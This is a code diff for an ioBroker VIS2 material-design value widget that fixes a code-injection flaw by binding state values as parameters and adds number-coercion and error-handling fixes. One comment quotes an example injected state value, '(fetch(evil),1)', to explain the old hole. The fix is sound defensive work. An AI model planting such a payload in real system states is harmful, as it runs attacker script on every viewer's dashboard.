@@ -2,7 +2,7 @@ import React from 'react';
 
 import type { RxWidgetInfo, VisRxWidgetProps } from '@iobroker/types-vis-2';
 
-import { squarePreview, BaseRxData, RenderProps, VisWidget, createInfo, designStyle, designStyleClasses, iconField, sizeCss, stateValue, formatMoment, formatDurationTokens, humanizeDuration, visLocale, sanitizeHtml, stringValue } from './widgetUtils';
+import { squarePreview, BaseRxData, RenderProps, VisWidget, createInfo, designStyle, designStyleClasses, iconField, numberValue, optionalNumber, sizeCss, stateValue, formatMoment, formatDurationTokens, humanizeDuration, visLocale, sanitizeHtml, stringValue } from './widgetUtils';
 import { renderIcon } from './MaterialDesignButtons';
 import { fill, withAutoFill } from './deviceFill';
 
@@ -125,10 +125,9 @@ const attrs: RxWidgetInfo['visAttrs'] = [
     },
 ];
 
-function number(value: unknown, fallback = 0): number {
-    const parsed = Number(value);
-    return Number.isFinite(parsed) ? parsed : fallback;
-}
+// The shared coercion, not a local `Number()`: VIS2 stores a cleared number field as '' or null,
+// and `Number('')` is a finite 0 that silently beats the declared default.
+const number = numberValue;
 
 function text(value: unknown, fallback = ''): string {
     return stringValue(value, fallback);
@@ -139,21 +138,47 @@ function color(value: unknown, fallback = ''): string {
     return raw.startsWith('#mdwTheme:') ? fallback : raw || fallback;
 }
 
-export function replaceValue(expression: string, value: unknown): string {
-    const parsed = Number(value);
-    return expression.replace(/#value/g, Number.isFinite(parsed) ? String(parsed) : text(value));
-}
+// `#value` is BOUND as an argument, never spliced into the source. The value comes from a state, so
+// anyone able to write that state could otherwise put JS in it: with the old text substitution a
+// state holding `(fetch(evil),1)` ran on every dashboard showing the widget.
+// Binding also ends the ReferenceError a plain string value used to throw — `#value == "on"` became
+// the bare identifier `on` — which took the whole VIS2 view down with it, since a view renders its
+// widgets in one tree without an error boundary. Hence the catch as well: a broken expression is the
+// author's typo, not a reason to blank the page.
+const VALUE_PARAM = '__mdwValue';
+const compiledExpressions = new Map<string, (value: unknown) => unknown>();
 
+/** The expression's result, or `undefined` when it could not be evaluated — callers keep their input. */
 function evalMaybe(expression: string | undefined, value: unknown): unknown {
     if (!expression?.includes('#value')) {
         return expression;
     }
-    const replaced = replaceValue(expression, value);
-    const math = (window as unknown as { math?: { evaluate?: (value: string) => unknown } }).math;
-    if (math?.evaluate) {
-        return math.evaluate(replaced);
+    const source = expression.replace(/#value/g, VALUE_PARAM);
+    // A numeric value is bound as a number so `#value > 20` still compares numerically.
+    const parsed = Number(value);
+    const bound: unknown = Number.isFinite(parsed) ? parsed : value;
+    const math = (window as unknown as { math?: { evaluate?: (value: string, scope: object) => unknown } }).math;
+    try {
+        if (math?.evaluate) {
+            return math.evaluate(source, { [VALUE_PARAM]: bound });
+        }
+        // Compiled once per expression, not once per render — and a syntax error is cached as the
+        // no-op, so a typo in the editor logs one line instead of one per render forever.
+        let compiled = compiledExpressions.get(source);
+        if (!compiled) {
+            try {
+                compiled = Function(VALUE_PARAM, `"use strict";return (${source});`) as (value: unknown) => unknown;
+            } catch (error) {
+                console.error(`materialdesign value: cannot compile expression: ${expression}`, error);
+                compiled = () => undefined;
+            }
+            compiledExpressions.set(source, compiled);
+        }
+        return compiled(bound);
+    } catch (error) {
+        console.error(`materialdesign value: expression failed: ${expression}`, error);
+        return undefined;
     }
-    return Function(`"use strict";return (${replaced});`)() as unknown;
 }
 
 function formatDuration(seconds: number, template: string): string {
@@ -171,7 +196,7 @@ function formatTimestamp(seconds: number, template: string): string {
 export function formatNumber(value: unknown, data: ValueData): string {
     let current = value;
     if (data.calculate?.includes('#value')) {
-        current = evalMaybe(data.calculate, current);
+        current = evalMaybe(data.calculate, current) ?? current;
     }
     const numeric = Number(current);
     if (data.convertToDuration && Number.isFinite(numeric)) {
@@ -183,10 +208,13 @@ export function formatNumber(value: unknown, data: ValueData): string {
     if (!Number.isFinite(numeric)) {
         return text(current);
     }
-    const min = data.minDecimals === undefined ? undefined : number(data.minDecimals);
+    // `optionalNumber`, not `=== undefined`: VIS2 stores a cleared number field as '' or null, and
+    // `Number('')` is a finite 0 — a user who emptied maxDecimals lost every decimal place.
+    const min = optionalNumber(data.minDecimals);
     // `Intl.NumberFormat` throws a RangeError when max < min, and VIS2 renders a view's widgets in one
     // tree without an error boundary, so that combination blanked the whole view.
-    const max = data.maxDecimals === undefined ? undefined : Math.max(number(data.maxDecimals), min ?? 0);
+    const configuredMax = optionalNumber(data.maxDecimals);
+    const max = configuredMax === undefined ? undefined : Math.max(configuredMax, min ?? 0);
     const formatted = new Intl.NumberFormat(undefined, {
         minimumFractionDigits: min,
         maximumFractionDigits: max,
@@ -197,7 +225,7 @@ export function formatNumber(value: unknown, data: ValueData): string {
 export function formatBoolean(value: unknown, data: ValueData): string {
     let current = value;
     if (data.condition?.includes('#value')) {
-        current = evalMaybe(data.condition, current);
+        current = evalMaybe(data.condition, current) ?? current;
     }
     const on = current === true || current === 'true' || current === 1 || current === '1';
     return on ? text(data.textOnTrue, text(current)) : text(data.textOnFalse, text(current));
